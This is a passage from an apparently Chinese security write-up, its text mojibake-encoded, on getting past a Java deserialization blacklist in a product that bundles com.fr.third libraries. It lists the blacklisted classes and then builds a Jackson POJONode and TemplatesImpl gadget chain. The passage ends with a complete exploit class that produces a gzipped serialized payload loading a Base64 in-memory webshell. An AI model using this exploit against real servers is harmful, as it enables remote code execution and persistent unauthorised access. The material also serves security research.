org.jboss.interceptor.reader.SimpleInterceptorMetadata
org.jboss.interceptor.spi.instance.InterceptorInstantiator
org.jboss.interceptor.spi.metadata.InterceptorReference
org.jboss.interceptor.spi.metadata.MethodMetadata
org.jboss.interceptor.spi.model.InterceptionType
org.jboss.interceptor.spi.model.InterceptionModel
sun.rmi.server.UnicastRef
sun.rmi.transport.LiveRef
sun.rmi.transport.tcp.TCPEndpoint
java.rmi.server.RemoteObject
java.rmi.server.RemoteRef
java.rmi.server.ObjID
java.rmi.RemoteObjectInvocationHandler
java.rmi.server.UnicastRemoteObject
java.rmi.registry.Registry
sun.rmi.server.ActivationGroupImpl
sun.rmi.server.UnicastServerRef
org.springframework.aop.framework.AdvisedSupport
net.sf.json.JSONObject
javax.xml.transform.Templates
org.jboss.weld.interceptor.builder.InterceptionModelBuilder
org.jboss.weld.interceptor.builder.MethodReference
org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory
org.jboss.weld.interceptor.proxy.InterceptorMethodHandler
org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference
org.jboss.weld.interceptor.reader.DefaultMethodMetadata
org.jboss.weld.interceptor.reader.ReflectiveClassMetadata
org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata
org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator
org.jboss.weld.interceptor.spi.metadata.InterceptorReference
org.jboss.weld.interceptor.spi.metadata.MethodMetadata
org.jboss.weld.interceptor.spi.model.InterceptionModel
org.jboss.weld.interceptor.spi.model.InterceptionType
org.python.core.PyObject
org.python.core.PyBytecode
org.python.core.PyFunction
org.apache.myfaces.context.servlet.FacesContextImpl
org.apache.myfaces.context.servlet.FacesContextImplBase
org.apache.myfaces.el.CompositeELResolver
org.apache.myfaces.el.unified.FacesELContext
org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression
com.sun.syndication.feed.impl.ObjectBean
com.fr.third.springframework.beans.factory.ObjectFactory
com.fr.third.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider
com.fr.third.springframework.aop.framework.AdvisedSupport
com.fr.third.springframework.aop.target.SingletonTargetSource
com.fr.third.springframework.aop.framework.JdkDynamicAopProxy
com.vaadin.data.util.NestedMethodProperty
com.vaadin.data.util.PropertysetItem
java.util.PriorityQueue
java.lang.reflect.Proxy
javax.management.MBeanServerInvocationHandler
javax.management.openmbean.CompositeDataInvocationHandler
java.beans.EventHandler
java.util.Comparator
com.fr.third.org.reflections.Reflections
```  
  
  
ä»è¿™é‡Œçœ‹çš„é»‘åå•å‘ç°é“¾æœ‰spring(JONS1)ã€c3p0ã€cc4ã€hibernate  
#### JACKSONé“¾  
  
åœ¨å†™EXPçš„è¿‡ç¨‹ä¸­çªç„¶å‘ç° POJONode å’Œ TemplatesImpl æ ¹æœ¬å°±ä¸åœ¨é»‘åå•é‡Œï¼Œé‚£ä¹ˆæˆ‘ ä¸å°±å¯ä»¥ç›´æ¥è¿›è¡Œç»“åˆæ¥rceå˜›  
##### æ€è·¯  
```
//ç¬¬ä¸€æ®µæ˜¯åœ¨Â com.fasterxml.jackson.databind.node.BaseJsonNodeÂ è¢«ç±»åŠ è½½å™¨åŠ è½½å‰ï¼Œä½¿ç”¨Â javassistÂ å·¥å…·åˆ é™¤å®ƒçš„Â writeReplaceÂ æ–¹æ³•ï¼Œé˜²æ­¢è§¦å‘è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ä¼šæ£€æµ‹Â æŠ¥é”™

        CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

//ä¸åŠ æ­¤æ®µä»£ç  ä¼šçˆ†å¦‚ä¸‹é”™è¯¯
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtT3rbogn3W5wnbgE7M6QL9KXJKEn8exYx8fo9K1bkFOqjVNib3ZVjKyicQ/640?wx_fmt=png&from=appmsg "")  
```
//ç¬¬äºŒæ®µæ˜¯æ„é€ ä¸€ä¸ª TemplatesImpl ç±»å‹çš„å¯¹è±¡ï¼Œç„¶åç”¨å…¶æ„é€ ä¸€ä¸ª POJONode ç±»å‹çš„å¯¹è±¡ã€‚
        String memshell = "";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] classBytes = new BASE64Decoder().decodeBuffer(memshell);

        Class tplClass = TemplatesImpl.class;
        Class transFactory = TransformerFactoryImpl.class;
        Object templates = tplClass.newInstance();

        SetFieldValue.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        SetFieldValue.setFieldValue(templates, "_name", "bbb");
        SetFieldValue.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        POJONode node = new POJONode(templates);
```  
```
//ç¬¬ä¸‰æ®µæ˜¯å°†è¿™ä¸ª POJONode ç±»å‹çš„å¯¹è±¡è®¾ç½®ä¸º BadAttributeValueExpException ç±»å‹çš„å¯¹è±¡çš„ val å­—æ®µçš„å€¼ï¼Œä¹‹åååºåˆ—åŒ–æ—¶è§¦å‘ POJONode ç±»å‹çš„å¯¹è±¡çš„ toString æ–¹æ³•
ã€‚
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        SetFieldValue.setFieldValue(val,"val",node);
```  
  
**ç¼ºç‚¹-JACKSON é“¾çš„ä¸ç¨³å®šæ€§**  
```
JACKSON é“¾çš„ä¸ç¨³å®šæ€§
æœ‰æ—¶åœ¨ä½¿ç”¨ JACKSON é“¾æ—¶ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°æŠ¥é”™
è¿™æ˜¯å› ä¸º JACKSON é“¾è§¦å‘è¿‡ç¨‹ä¸­ï¼Œåœ¨ com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields ä¸­è·å–äº†ä¹‹å‰æ‰¾åˆ°çš„ propsï¼Œä¸”å¾ªç¯è§¦å‘å…¶ getter
è€Œä¸æ˜¯ç›´æ¥è§¦å‘ TemplatesImpl#getOutputProperties å”¯ä¸€çš„getter

æ‰€ä»¥ysoå†™çš„æ˜¯JSON1 é“¾ï¼Œå› ä¸ºè°ƒç”¨ç›´æ¥æ˜¯ getOutputProperties  getter

ä¸è¿‡åœ¨ç¯å¢ƒä¸­ org.springframework.aop.framework.JdkDynamicAopProxy ç­‰éƒ½åœ¨é»‘åå•æ‰€ä»¥æ— æ³•ç”¨ JSON1 é“¾
```  
#### å†…å­˜ç EXP  
  
æœ€ç»ˆEXPå¦‚ä¸‹  
```
public class POJONodeExp2 {
    public static void main(String[] args) throws Exception {

        CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        String memshell = "Base64ç¼–ç çš„å†…å­˜é©¬";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] classBytes = new BASE64Decoder().decodeBuffer(memshell);

        Class tplClass = TemplatesImpl.class;
        Class transFactory = TransformerFactoryImpl.class;
        Object templates = tplClass.newInstance();
        //ç›´æ¥è¯»å–classæ–‡ä»¶
//        byte[] classBytes = Files.readAllBytes(Paths.get("Evil.class"));

        SetFieldValue.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        SetFieldValue.setFieldValue(templates, "_name", "bbb");
        SetFieldValue.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        POJONode node = new POJONode(templates);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        SetFieldValue.setFieldValue(val,"val",node);

        byte[] serialize = Serializer.serialize(val);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}

```  
  
